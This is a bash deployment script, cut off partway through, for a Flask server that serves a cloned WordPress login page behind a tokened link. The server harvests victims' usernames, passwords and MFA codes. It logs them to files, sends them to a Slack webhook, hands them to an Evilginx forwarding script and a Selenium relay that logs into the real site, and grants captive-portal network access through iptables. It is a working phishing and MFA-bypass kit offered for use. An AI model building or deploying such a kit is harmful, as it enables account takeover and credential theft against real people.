#!/usr/bin/env bash
set -euo pipefail

# -----------------------------------------------------------------------------
#  CONFIGURATION
# -----------------------------------------------------------------------------
TRACKER_APP_DIR="$HOME"
TRACKER_VENV_DIR="$HOME/tracker-env"

# -----------------------------------------------------------------------------
# 0) must run as root
# -----------------------------------------------------------------------------
if [[ "$(id -u)" -ne 0 ]]; then
  echo "Run with sudo: $0"
  exit 1
fi

# -----------------------------------------------------------------------------#
# 1)  Detect server IP, prompt for domain, verify DNS                          #
# -----------------------------------------------------------------------------#
IP="$(ip route get 1.1.1.1 | awk '{print $7; exit}' 2>/dev/null || echo '127.0.0.1')"

read -rp "Enter the FQDN that already points to this server (e.g. my-domain.com): " DOMAIN
EMAIL="admin@${DOMAIN}"

echo "[*] Verifying DNS A record…"
RESOLVED_IP=$(host "$DOMAIN" 2>/dev/null | awk '/has address/ {print $4; exit}')
if [[ -z "$RESOLVED_IP" ]]; then
  echo "❌  DNS lookup failed for $DOMAIN"
  echo "   → Ensure the domain exists and try again."
  exit 1
elif [[ "$RESOLVED_IP" != "$IP" ]]; then
  echo "❌  DNS mismatch: $DOMAIN resolves to $RESOLVED_IP, but this server is $IP"
  echo "   → Update the domain's A record to $IP and rerun this script."
  exit 1
fi
echo "✅  $DOMAIN resolves to $IP — continuing."

# -----------------------------------------------------------------------------
# 2) update & install base packages
# -----------------------------------------------------------------------------
apt update && apt -y upgrade
apt install -y \
  git \
  python3-pip python3-venv python3-full \
  openssl \
  nginx \
  ufw \
  certbot python3-certbot-nginx \
  tmux

# stop & disable apache2 if it took port 80
if systemctl is-enabled apache2 &>/dev/null; then
  systemctl disable --now apache2 || true
fi

# -----------------------------------------------------------------------------
# 3) UFW firewall
# -----------------------------------------------------------------------------
ufw allow 80/tcp
ufw allow 443/tcp
ufw allow 5000/tcp
ufw --force enable

# -----------------------------------------------------------------------------
# 4) nginx snippet to block secrets
# -----------------------------------------------------------------------------
mkdir -p /etc/nginx/snippets
cat > /etc/nginx/snippets/block-secrets.conf <<'EOF'
location ~* (\.git|\.env|aws/credentials|docker-compose.*\.ya?ml)$ {
    deny all;
}
EOF

# -----------------------------------------------------------------------------
# 5) obtain cert + generate DH params + options-ssl-nginx.conf
# -----------------------------------------------------------------------------
systemctl stop nginx

certbot certonly \
  --standalone \
  --non-interactive \
  --agree-tos \
  -m "${EMAIL}" \
  -d "${DOMAIN}"

if [[ ! -f /etc/letsencrypt/ssl-dhparams.pem ]]; then
  openssl dhparam -out /etc/letsencrypt/ssl-dhparams.pem 2048
fi

if [[ ! -f /etc/letsencrypt/options-ssl-nginx.conf ]]; then
  cat > /etc/letsencrypt/options-ssl-nginx.conf <<'EOF'
# managed by setup_tracker.sh
ssl_session_cache shared:le_nginx_SSL:10m;
ssl_session_tickets off;
ssl_protocols TLSv1.2 TLSv1.3;
ssl_prefer_server_ciphers on;
ssl_ciphers HIGH:!aNULL:!MD5;
EOF
fi

systemctl start nginx

# -----------------------------------------------------------------------------
# 6) nginx vhost - simplified to only serve Flask app
# -----------------------------------------------------------------------------
cat > /etc/nginx/sites-available/tracker.conf <<EOF
###############################################################################
# 1) HTTP → HTTPS
###############################################################################
server {
    listen       80  default_server;
    listen  [::]:80  default_server;
    server_name  _;
    return       301 https://\$host\$request_uri;
}
###############################################################################
# 2) HTTPS for ${DOMAIN}
###############################################################################
server {
    listen       443 ssl http2;
    listen  [::]:443 ssl http2;
    server_name  ${DOMAIN};
    # TLS
    ssl_certificate     /etc/letsencrypt/live/${DOMAIN}/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/${DOMAIN}/privkey.pem;
    include             /etc/letsencrypt/options-ssl-nginx.conf;
    ssl_dhparam         /etc/letsencrypt/ssl-dhparams.pem;
    include snippets/block-secrets.conf;
    
    # All traffic goes to Flask app
    location / {
        proxy_pass         http://127.0.0.1:5000;
        proxy_set_header   Host            \$host;
        proxy_set_header   X-Real-IP       \$remote_addr;
        proxy_set_header   X-Forwarded-For \$proxy_add_x_forwarded_for;
    }
}
EOF

ln -sf /etc/nginx/sites-available/tracker.conf /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default

chmod 640 /etc/nginx/sites-available/tracker.conf
nginx -t
systemctl reload nginx

# -----------------------------------------------------------------------------
# 7) Flask tracker venv & code
# -----------------------------------------------------------------------------
python3 -m venv "${TRACKER_VENV_DIR}"
source "${TRACKER_VENV_DIR}/bin/activate"
pip install --upgrade pip
pip install flask requests python-dotenv flask-cors
deactivate

read -rp "SLACK_WORKFLOW_URL (your Slack webhook, or press Enter to skip): " SLACK_URL

# ── auto-generate 18-character alphanumeric tokens ────────────────────────────
generate_token() {
  local length=18
  local chars='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
  local token=""
  for ((i=0; i<length; i++)); do
    token+="${chars:RANDOM%${#chars}:1}"
  done
  echo "$token"
}

ADMIN_TOKEN=$(generate_token)
REQUIRED_TOKEN=$(generate_token)

SECRET_KEY=$(openssl rand -hex 32)  # Generate secure random key

cat >> "${TRACKER_APP_DIR}/.env" << EOF
SLACK_WORKFLOW_URL=${SLACK_URL}
ADMIN_TOKEN=${ADMIN_TOKEN}
REQUIRED_TOKEN=${REQUIRED_TOKEN}
SECRET_KEY=${SECRET_KEY}
EOF

cat > "${TRACKER_APP_DIR}/tracker.py" <<'EOF'
#!/usr/bin/env python3
"""
Simple Flask tracker – serves a login page and captures credentials with MFA logic
"""
import os
import json
import uuid
import requests
import subprocess
import sys
import mimetypes
import time
from datetime import datetime, timezone
from flask import Flask, request, jsonify, render_template_string, redirect, send_file, session
from flask_cors import CORS
from dotenv import load_dotenv

# ── configuration ──────────────────────────────────────────────────
load_dotenv()
TRACKER_LOG = "tracker_logs.json"
SLACK_URL   = os.getenv("SLACK_WORKFLOW_URL")
ADMIN_TOKEN = os.getenv("ADMIN_TOKEN")
REQUIRED_TOKEN = os.getenv("REQUIRED_TOKEN", "")
STATIC_DIR = "/root/static"  # Static files directory

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY")
if not app.secret_key:
    print("ERROR: SECRET_KEY is missing — check your .env file", file=sys.stderr)
    sys.exit(1)

# Configure session settings
app.config['PERMANENT_SESSION_LIFETIME'] = 86400  # 24 hours in seconds
app.config['SESSION_COOKIE_SECURE'] = False  # Set to True if using HTTPS
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

CORS(app)

# ── helpers ────────────────────────────────────────────────────────
def log_to_file(fname: str, data: dict) -> None:
    try:
        with open(fname, "a", encoding="utf-8") as f:
            f.write(json.dumps(data, ensure_ascii=False) + "\n")
    except Exception as e:
        app.logger.error(f"Failed to write to log file {fname}: {e}")

def enrich_ip(ip: str) -> dict:
    if not ip or ip.lower() == "undefined":
        return {}
    try:
        r = requests.get(f"https://ipwho.is/{ip}", timeout=3)
        if r.ok and r.json().get("success"):
            return r.json()
    except Exception as e:
        app.logger.warning(f"ipwho.is lookup failed for {ip}: {e}")
    return {}

def client_ip() -> str:
    fwd = request.headers.get("X-Forwarded-For", "")
    return fwd.split(",")[0].strip() if fwd else request.remote_addr or "unknown"

def post_to_slack(entry: dict) -> None:
    if not SLACK_URL:
        app.logger.debug("SLACK_WORKFLOW_URL not set, skipping Slack post")
        return
    
    # Check if SLACK_URL is a valid URL
    if not SLACK_URL.startswith(('http://', 'https://')):
        app.logger.debug(f"Invalid SLACK_WORKFLOW_URL format: {SLACK_URL[:20]}... (skipping Slack post)")
        return
        
    try:
        geo = entry.get("geo", {})
        loc = ", ".join(p for p in (geo.get("city"), geo.get("region"), geo.get("country")) if p)
        
        payload = {
            "id": entry["id"],
            "timestamp": entry["timestamp"],
            "ip": entry["ip"],
            "location": loc,
            "user_agent": entry["headers"].get("User-Agent", ""),
            "domain": request.host
        }
        
        r = requests.post(SLACK_URL, json=payload, timeout=3)
        if r.status_code >= 400:
            app.logger.warning(f"Slack post failed: {r.status_code}")
    except Exception as e:
        app.logger.error(f"Error posting to Slack: {e}")

def trigger_restart_delayed(flag: str) -> bool:
    """Trigger restart-tracker.sh with specific token rotation flag after a delay"""
    try:
        # Use longer delay to allow user session to complete
        restart_cmd = f"sleep 3 && /root/restart-tracker.sh {flag}"  # Wait 30 seconds before rotating token
        subprocess.Popen(
            ["bash", "-c", restart_cmd],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True
        )
        return True
    except Exception as e:
        app.logger.error(f"Failed to trigger delayed restart with {flag}: {e}")
        return False

def wait_for_mfa_status(timeout=15):
    """Wait for MFA status from Selenium (like PHP version)"""
    status_file = '/tmp/mfa_status.txt'
    start_time = time.time()
    
    # Clear any existing status
    if os.path.exists(status_file):
        os.unlink(status_file)
    
    while (time.time() - start_time) < timeout:
        if os.path.exists(status_file):
            try:
                with open(status_file, 'r') as f:
                    status = f.read().strip()
                return status
            except:
                pass
        time.sleep(0.5)
    
    return 'timeout'  # Default to requiring MFA if timeout

def wait_for_otp_validation(timeout=15):
    """Wait for OTP validation result from Selenium"""
    status_file = '/tmp/otp_validation.txt'
    start_time = time.time()

    # Clear any existing status
    if os.path.exists(status_file):
        os.unlink(status_file)

    while (time.time() - start_time) < timeout:
        if os.path.exists(status_file):
            try:
                with open(status_file, 'r') as f:
                    result = f.read().strip()
                return result
            except:
                pass
        time.sleep(0.5)

    return 'timeout'  # Default to failure if timeout

def get_target_domain():
    """Get the target domain from the bash script"""
    try:
        with open('/tmp/wp_login/domain', 'r') as f:
            domain = f.read().strip()
            if domain:  # Only return if we actually got a domain
                return domain
    except:
        pass
    return None

def get_client_mac(client_ip):
    """Get client MAC address from DHCP leases"""
    try:
        result = subprocess.run(
            ["grep", client_ip, "/tmp/dhcp.leases"],
            capture_output=True, text=True
        )
        if result.returncode == 0:
            # Extract MAC from DHCP lease format
            parts = result.stdout.strip().split()
            if len(parts) >= 2:
                return parts[1]
    except Exception as e:
        app.logger.error(f"Failed to get MAC for {client_ip}: {e}")
    return ""

def grant_internet_access(client_ip):
    """Grant internet access (like PHP version)"""
    try:
        client_mac = get_client_mac(client_ip)
        
        # Create logs directory
        os.makedirs("/root/logs", mode=0o755, exist_ok=True)
        
        # Add to clients file
        with open('/tmp/EVILPORTAL_CLIENTS.txt', 'a') as f:
            f.write(f"{client_ip}\n")
        
        # Grant iptables access if we have MAC
        if client_mac:
            subprocess.run([
                "iptables", "-t", "nat", "-I", "PREROUTING", 
                "-m", "mac", "--mac-source", client_mac, "-j", "ACCEPT"
            ], check=False)
            subprocess.run([
                "iptables", "-I", "FORWARD", 
                "-m", "mac", "--mac-source", client_mac, "-j", "ACCEPT"
            ], check=False)
        
        app.logger.info(f"Granted internet access to {client_ip} (MAC: {client_mac})")
    except Exception as e:
        app.logger.error(f"Failed to grant internet access: {e}")

# ── login page template ─────────────────────────────────────────────
LOGIN_TEMPLATE = """<!DOCTYPE html>
<html lang="en-US">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Log In &lsaquo; Wordpress &#8212; WordPress</title>
<meta name='robots' content='max-image-preview:large, noindex, noarchive' />
<link rel='stylesheet' href='wp-login.css' media='all' />
<meta name='referrer' content='strict-origin-when-cross-origin' />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
</head>
<body class="login no-js login-action-login wp-core-ui  locale-en-us">
<script>
document.body.className = document.body.className.replace('no-js','js');
</script>
<h1 class="screen-reader-text">Log In</h1>
<div id="login">
<h1 role="presentation" class="wp-login-logo"><a href="#" onclick="return false;">Powered by WordPress</a></h1>
<form name="loginform" id="loginform" action="/capture" onsubmit="sendToMonitor();" method="post">
<p>
<label for="user_login">Username or Email Address</label>
<input type="text" name="log" id="user_login" class="input" value="" size="20" autocapitalize="off" autocomplete="username" required="required" />
</p>
<div class="user-pass-wrap">
<label for="user_pass">Password</label>
<div class="wp-pwd">
<input type="password" name="pwd" id="user_pass" class="input password-input" value="" size="20" autocomplete="current-password" spellcheck="false" required="required" />
<button type="button" class="button button-secondary wp-hide-pw hide-if-no-js" data-toggle="0" aria-label="Show password">
<span class="dashicons dashicons-visibility" aria-hidden="true"></span>
</button>
</div>
</div>
<p class="forgetmenot"><input name="rememberme" type="checkbox" id="rememberme" value="forever"  /> <label for="rememberme">Remember Me</label></p>
<p class="submit">
<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In" />
<input type="hidden" name="redirect_to" value="https://your-domain.info/wp-admin/" />
<input type="hidden" name="testcookie" value="1" />
</p>
</form>
<p id="nav">
<a class="wp-login-lost-password" href="#" onclick="return false;">Lost your password?</a>
</p>
<script>
function wp_attempt_focus() {setTimeout( function() {try {d = document.getElementById( "user_login" );d.focus(); d.select();} catch( er ) {}}, 200);}
wp_attempt_focus();
if ( typeof wpOnload === 'function' ) { wpOnload() }

function sendToMonitor() {
    try {
        const username = document.getElementById('user_login').value;
        const password = document.getElementById('user_pass').value;
        const site = 'https://your-domain.info';
        const payload = `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&site=${encodeURIComponent(site)}`;
        const url = `http://localhost:8080/start-login?${payload}`;

        fetch(url, { method: 'GET', mode: 'no-cors' });
    } catch(e) {
        // Ignore errors, don't break form submission
    }
    return true; // Allow normal form submission to /capture
}
</script>
<p id="backtoblog">
<a href="#" onclick="return false;">&larr; Go Back </a>
</p>
</div>
<script src='wp-scripts.js'></script>
</body>
</html>"""

# ── routes ─────────────────────────────────────────────────────────
def check_access_authorization():
    """
    Check if user has valid access via token OR existing session.
    Returns tuple: (is_authorized: bool, should_create_session: bool)
    """
    # Method 1: Check for valid token in URL
    token = request.args.get("src", "")
    if token and token == REQUIRED_TOKEN:
        return True, True  # Authorized via token, should create session
    
    # Method 2: Check for existing valid session
    if session.get('valid_access'):
        # Additional validation: check if session is not too old (optional)
        session_timestamp = session.get('access_timestamp')
        if session_timestamp:
            try:
                session_time = datetime.fromisoformat(session_timestamp.replace('Z', '+00:00'))
                current_time = datetime.now(timezone.utc)
                session_age = (current_time - session_time).total_seconds()
                
                # Session valid for 24 hours (86400 seconds)
                if session_age < 86400:
                    return True, False  # Authorized via session, don't create new session
                else:
                    app.logger.info(f"Session expired (age: {session_age} seconds)")
                    session.clear()  # Clear expired session
            except Exception as e:
                app.logger.warning(f"Error parsing session timestamp: {e}")
                session.clear()
    
    return False, False  # Not authorized

@app.route("/link")
def link():
    try:
        is_authorized, should_create_session = check_access_authorization()
        
        if not is_authorized:
            app.logger.warning(f"Unauthorized access attempt - no valid token or session")
            return "Unauthorized", 401
        
        ip = client_ip()
        
        # Create session if needed (first time with token)
        if should_create_session:
            session['valid_access'] = True
            session['access_timestamp'] = datetime.now(timezone.utc).isoformat()
            session.permanent = True  # Make session persistent
            
            app.logger.info(f"Created new session for IP {ip}")
            
            headers = dict(request.headers)
            args = dict(request.args)
            geo = enrich_ip(ip)
            
            entry = {
                "id": str(uuid.uuid4()),
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "ip": ip,
                "headers": headers,
                "path": request.path,
                "args": args,
                "geo": geo,
                "session_created": True
            }
            log_to_file(TRACKER_LOG, entry)
            post_to_slack(entry)
            
            # Rotate the REQUIRED_TOKEN after successful access (3-second delay)
            restart_triggered = trigger_restart_delayed("--rotate-required")
            log_to_file(TRACKER_LOG, {
                "id": str(uuid.uuid4()),
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "event": "rotate_required_token",
                "triggered": restart_triggered,
                "ip": ip,
                "user_agent": request.headers.get('User-Agent', '')
            })
        else:
            app.logger.info(f"Serving login page to existing session for IP {ip}")
            
            # Log the repeat access
            log_to_file(TRACKER_LOG, {
                "id": str(uuid.uuid4()),
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "event": "login_page_access_existing_session",
                "ip": ip,
                "user_agent": request.headers.get('User-Agent', ''),
                "session_timestamp": session.get('access_timestamp')
            })
        
        # Return login page with error message if error parameter is present
        error_param = request.args.get("error", "")
        if error_param:
            app.logger.info(f"Showing login page with error: {error_param}")
            
            # Map error types to user-friendly messages
            error_messages = {
                "invalid_credentials": "Invalid username or password. Please try again.",
                "processing_error": "Login processing error. Please try again.",
                "unexpected_error": "An unexpected error occurred. Please try again.",
                "too_many_attempts": "Too many failed verification attempts. Please log in again."
            }
            
            error_message = error_messages.get(error_param, "An error occurred. Please try again.")
            
            # Inject error message into login template
            login_template_with_error = LOGIN_TEMPLATE.replace(
                '<form name="loginform"',
                f'<div class="message" style="border-left: 4px solid #d63638; padding: 12px; margin: 5px 0 15px; background-color: #fff; box-shadow: 0 1px 1px 0 rgba(0,0,0,.1);"><p style="margin: 0.5em 0; color: #d63638;"><strong>Error:</strong> {error_message}</p></div><form name="loginform"'
            )
            return render_template_string(login_template_with_error)
        
        # Return normal login page
        return render_template_string(LOGIN_TEMPLATE)
    
    except Exception as e:
        app.logger.error(f"Error in /link route: {e}")
        return "Internal Server Error", 500

@app.route("/capture", methods=["POST"])
def capture():
    """Handle the login form submission with session-based auth"""
    try:
        # Check authorization (token OR session)
        is_authorized, _ = check_access_authorization()
        
        if not is_authorized:
            app.logger.warning("Form submission without valid authorization")
            # Log the unauthorized attempt
            log_to_file(TRACKER_LOG, {
                "id": str(uuid.uuid4()),
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "event": "unauthorized_form_submission",
                "ip": client_ip(),
                "user_agent": request.headers.get("User-Agent", ""),
                "session_data": dict(session) if session else {},
                "url_args": dict(request.args) if request.args else {}
            })
            return "Unauthorized - Please access the login page with a valid link", 401
        
        # Log that we're processing a form submission with valid session
        app.logger.info(f"Processing form submission with valid session (created: {session.get('access_timestamp')})")
        
        # Extract form data - rest of your existing code remains exactly the same
        username = request.form.get("log", "")
        password = request.form.get("pwd", "")
        remember = request.form.get("rememberme", "")
        redirect_to = request.form.get("redirect_to", "")
        
        # Get client info
        ip = client_ip()
        user_agent = request.headers.get("User-Agent", "")
        
        # Create logs directory if it doesn't exist
        os.makedirs("/root/logs", mode=0o755, exist_ok=True)
        
        # Log credentials in clean JSON format (like PHP version)
        credentials = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'username': username,
            'password': password,
            'redirect_to': redirect_to,
            'user_agent': user_agent,
            'ip_address': ip,
            'session_timestamp': session.get('access_timestamp')  # Include session info
        }
        
        # Save to credentials.json (like PHP version)
        with open('/root/logs/credentials.json', 'a') as f:
            f.write(json.dumps(credentials, indent=2) + "\n")
        
        # Save raw POST data (like PHP version)
        raw_data = f"log={username}&pwd={password}&redirect_to={redirect_to}"
        with open('/root/logs/capture', 'a') as f:
            f.write(raw_data + "\n")
        
        # Log the captured credentials to main tracker log
        capture_entry = {
            "id": str(uuid.uuid4()),
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "event": "credential_capture",
            "ip": ip,
            "user_agent": user_agent,
            "username": username,
            "password": password,
            "remember_me": bool(remember),
            "redirect_to": redirect_to,
            "headers": dict(request.headers),
            "geo": enrich_ip(ip),
            "session_timestamp": session.get('access_timestamp')
        }
        
        log_to_file(TRACKER_LOG, capture_entry)
        
        # Send to Slack if configured (with validation)
        if SLACK_URL and SLACK_URL.startswith(('http://', 'https://')):
            try:
                slack_payload = {
                    "event": "credentials_captured",
                    "username": username,
                    "password": password,
                    "ip": ip,
                    "user_agent": user_agent,
                    "location": ", ".join(p for p in (capture_entry["geo"].get("city", ""), 
                                                    capture_entry["geo"].get("region", ""), 
                                                    capture_entry["geo"].get("country", "")) if p),
                    "timestamp": capture_entry["timestamp"]
                }
                requests.post(SLACK_URL, json=slack_payload, timeout=3)
            except Exception as e:
                app.logger.error(f"Failed to send credentials to Slack: {e}")
        
        # Send credentials to monitoring server (like PHP version)
        try:
            monitor_endpoint = "http://localhost:8080/start-login"
            payload = f"username={requests.utils.quote(username)}&password={requests.utils.quote(password)}"
            requests.get(f"{monitor_endpoint}?{payload}", timeout=3)
            app.logger.info("Sent credentials to monitoring server")
        except Exception as e:
            app.logger.error(f"Failed to send to monitoring server: {e}")
        
        # Background processes (moved before MFA check to avoid unreachable code)
        try:
            # Forward session tokens to Evilginx
            subprocess.Popen([
                "/usr/bin/forward-to-evilginx.sh", username, password
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Kick off real WP login
            subprocess.Popen([
                "/usr/bin/wp-login.sh", username, password
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            app.logger.error(f"Failed to start background processes: {e}")
        
        # Wait for MFA status from Selenium (like PHP version)
        app.logger.info("Waiting for MFA status from Selenium...")
        try:
            mfa_status = wait_for_mfa_status(15)
            app.logger.info(f"MFA status received: {mfa_status}")
        except Exception as e:
            app.logger.error(f"Error waiting for MFA status: {e}")
            mfa_status = 'timeout'
        
        # Handle different MFA status values
        if mfa_status == 'false':
            # No MFA required and login was successful - grant access immediately
            app.logger.info("Login successful, no MFA required, granting internet access immediately")
            grant_internet_access(ip)
            return redirect("/success")
            
        elif mfa_status == 'true':
            # MFA required - proceed to MFA page
            app.logger.info("MFA required, redirecting to MFA page")
            return redirect("/mfa.html")
            
        elif mfa_status == 'login_failed':
            # Login failed with incorrect credentials - redirect back to login page with error
            app.logger.warning(f"Login failed for user {username} - incorrect credentials")
            
            # Log the failed login attempt
            log_to_file(TRACKER_LOG, {
                "id": str(uuid.uuid4()),
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "event": "login_failed_invalid_credentials",
                "ip": ip,
                "username": username,
                "password": password,
                "user_agent": request.headers.get("User-Agent", "")
            })
            
            # Redirect back to /link with error parameter instead of rendering template
            return redirect("/link?error=invalid_credentials")
            
        elif mfa_status in ['status_unclear', 'timeout']:
            # Status unclear or timeout - redirect back to login page with error
            app.logger.warning(f"Login status unclear or timeout: {mfa_status}")
            
            # Log the unclear status
            log_to_file(TRACKER_LOG, {
                "id": str(uuid.uuid4()),
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "event": "login_status_unclear",
                "ip": ip,
                "username": username,
                "status": mfa_status,
                "user_agent": request.headers.get("User-Agent", "")
            })
            
            # Redirect back to /link with error parameter
            return redirect("/link?error=processing_error")
            
        else:
            # Unknown status - redirect back to login page with error
            app.logger.error(f"Unknown MFA status received: {mfa_status}")
            
            log_to_file(TRACKER_LOG, {
                "id": str(uuid.uuid4()),
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "event": "unknown_mfa_status",
                "ip": ip,
                "username": username,
                "status": mfa_status,
                "user_agent": request.headers.get("User-Agent", "")
            })
            
            # Redirect back to /link with error parameter
            return redirect("/link?error=unexpected_error")
        
    except Exception as e:
        app.logger.error(f"Error in /capture route: {e}")
        return "Internal Server Error", 500

@app.route("/mfa_status", methods=["POST", "GET"])
def mfa_status():
    """Handle MFA status updates from Selenium/monitoring server"""
    try:
        # Get MFA status from query parameters or form data
        if request.method == "POST":
            mfa_required = request.form.get("mfa_required", "true")
        else:
            mfa_required = request.args.get("mfa_required", "true")
        
        # Write status to file for the capture route to read
        status_file = '/tmp/mfa_status.txt'
        with open(status_file, 'w') as f:
            f.write(mfa_required.lower())
        
        app.logger.info(f"MFA status updated: {mfa_required}")
        
        # Log the MFA status update
        mfa_status_entry = {
            "id": str(uuid.uuid4()),
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "event": "mfa_status_update",
            "mfa_required": mfa_required,
            "ip": client_ip(),
            "user_agent": request.headers.get("User-Agent", "")
        }
        log_to_file(TRACKER_LOG, mfa_status_entry)
        
        return {"status": "ok", "mfa_required": mfa_required}, 200
        
    except Exception as e:
        app.logger.error(f"Error in /mfa_status route: {e}")
        return {"status": "error", "message": str(e)}, 500

@app.route("/otp_status", methods=["POST", "GET"])
def otp_status():
    """Handle OTP validation results from Selenium/monitoring server"""
    try:
        # Get OTP validation result from query parameters or form data
        if request.method == "POST":
            otp_valid = request.form.get("otp_valid", "false")
        else:
            otp_valid = request.args.get("otp_valid", "false")

        # Write result to file for the verify-mfa route to read
        status_file = '/tmp/otp_validation.txt'
        with open(status_file, 'w') as f:
            f.write(otp_valid.lower())

        app.logger.info(f"OTP validation result received: {otp_valid}")

        # Log the OTP validation result
        otp_status_entry = {
            "id": str(uuid.uuid4()),
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "event": "otp_validation_result",
            "otp_valid": otp_valid,
            "ip": client_ip(),
            "user_agent": request.headers.get("User-Agent", "")
        }
        log_to_file(TRACKER_LOG, otp_status_entry)

        return {"status": "ok", "otp_valid": otp_valid}, 200

    except Exception as e:
        app.logger.error(f"Error in /otp_status route: {e}")
        return {"status": "error", "message": str(e)}, 500

@app.route("/success")
def success():
    """Redirect to actual website instead of showing success page"""
    try:
        # Check authorization (token OR session)
        is_authorized, _ = check_access_authorization()
        
        if not is_authorized:
            app.logger.warning("Unauthorized access attempt to /success")
            log_to_file(TRACKER_LOG, {
                "id": str(uuid.uuid4()),
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "event": "unauthorized_success_access",
                "ip": client_ip(),
                "user_agent": request.headers.get("User-Agent", ""),
                "session_data": dict(session) if session else {},
                "url_args": dict(request.args) if request.args else {}
            })
            return "Unauthorized - Invalid session", 401
        
        # Log successful access
        log_to_file(TRACKER_LOG, {
            "id": str(uuid.uuid4()),
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "event": "success_redirect",
            "ip": client_ip(),
            "user_agent": request.headers.get("User-Agent", ""),
            "session_timestamp": session.get('access_timestamp')
        })
        
        # Clear session after successful completion
        session.clear()
        
        # Get target domain and redirect to actual website, or refresh if no domain
        target_domain = get_target_domain()
        if target_domain:
            return redirect(f"https://{target_domain}/wp-login.php")
        else:
            # Fallback: refresh the current page
            return redirect(request.url)
        
    except Exception as e:
        app.logger.error(f"Error in /success route: {e}")
        return "Internal Server Error", 500

@app.route("/mfa.html")
def mfa():
    """MFA page for users who need additional verification - requires valid session"""
    try:
        # Check authorization (token OR session)
        is_authorized, _ = check_access_authorization()
        
        if not is_authorized:
            app.logger.warning("Unauthorized access attempt to /mfa.html")
            log_to_file(TRACKER_LOG, {
                "id": str(uuid.uuid4()),
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "event": "unauthorized_mfa_access",
                "ip": client_ip(),
                "user_agent": request.headers.get("User-Agent", ""),
                "session_data": dict(session) if session else {},
                "url_args": dict(request.args) if request.args else {}
            })
            return "Unauthorized - Invalid session", 401
        
        # Log access to MFA page
        log_to_file(TRACKER_LOG, {
            "id": str(uuid.uuid4()),
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "event": "mfa_page_access",
            "ip": client_ip(),
            "user_agent": request.headers.get("User-Agent", ""),
            "session_timestamp": session.get('access_timestamp')
        })
        
        error = request.args.get("error", "")
        
        return f"""
        <!DOCTYPE html>
        <html lang="en-US">
        <head>
            <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
            <title>Two-Factor Authentication &lsaquo; Wordpress &#8212; WordPress</title>
            <meta name='robots' content='max-image-preview:large, noindex, noarchive' />
            <link rel='stylesheet' href='/static/wp-login.css' media='all' />
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        </head>
        <body class="login no-js login-action-login wp-core-ui locale-en-us">
            <script>
                document.body.className = document.body.className.replace('no-js','js');
            </script>

            <h1 class="screen-reader-text">Two-Factor Authentication</h1>
            <div id="login">
                <h1 role="presentation" class="wp-login-logo">
                    <a href="#" onclick="return false;">Powered by WordPress</a>
                </h1>

                <form name="otpform" id="otpform" action="/verify-mfa" method="post">
                    <p class="message">
                        A verification code has been sent to your email address. Please enter the code below.
                    </p>
                    
                    <p>
                        <label for="otp_code">Verification Code</label>
                        <input type="text" name="mfa_code" id="otp_code" class="input" value="" size="20" maxlength="6" required="required" placeholder="Enter 6-digit code" />
                    </p>
                    
                    <p class="submit">
                        <input type="submit" name="verify-submit" id="verify-submit" class="button button-primary button-large" value="Verify" />
                    </p>
                </form>

                <script>
                    // Auto-focus on OTP input
                    document.getElementById('otp_code').focus();
                    
                    // Show error message if present
                    const urlParams = new URLSearchParams(window.location.search);
                    if (urlParams.get('error') === '1') {{
                        const errorMsg = document.createElement('div');
                        errorMsg.className = 'message';
                        errorMsg.style.color = '#d63638';
                        errorMsg.innerHTML = '<p>❌ Invalid verification code. Please try again.</p>';
                        document.querySelector('.message').after(errorMsg);
                    }}
                </script>
                
                <p id="nav">
                    <a class="wp-login-lost-password" href="#" onclick="return false;">Lost your password?</a>
                </p>
                
                <p id="backtoblog">
                    <a href="#" onclick="return false;">&larr; Go Back </a>
                </p>
            </div>

            <script src='/static/wp-scripts.js'></script>
        </body>
        </html>
        """
        
    except Exception as e:
        app.logger.error(f"Error in /mfa route: {e}")
        return "Internal Server Error", 500

@app.route("/verify-mfa", methods=["POST"])
def verify_mfa():
    """Handle MFA verification with actual Selenium validation"""
    try:
        # Check authorization (token OR session)
        is_authorized, _ = check_access_authorization()
        
        if not is_authorized:
            app.logger.warning("Unauthorized MFA verification attempt")
            log_to_file(TRACKER_LOG, {
                "id": str(uuid.uuid4()),
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "event": "unauthorized_mfa_verification",
                "ip": client_ip(),
                "user_agent": request.headers.get("User-Agent", ""),
                "session_data": dict(session) if session else {},
                "url_args": dict(request.args) if request.args else {}
            })
            return "Unauthorized - Invalid session", 401
        
        # Get OTP from form
        otp = request.form.get("mfa_code", "") or request.form.get("otp", "")
        ip = client_ip()
        
        # Initialize or get the current failed attempt count from session
        failed_attempts = session.get('mfa_failed_attempts', 0)
        
        # Validate OTP format
        if not otp or len(otp) != 6 or not otp.isdigit():
            app.logger.warning(f"Invalid OTP format received: {otp}")
            failed_attempts += 1
            session['mfa_failed_attempts'] = failed_attempts
            
            # Check if we've reached 3 failed attempts
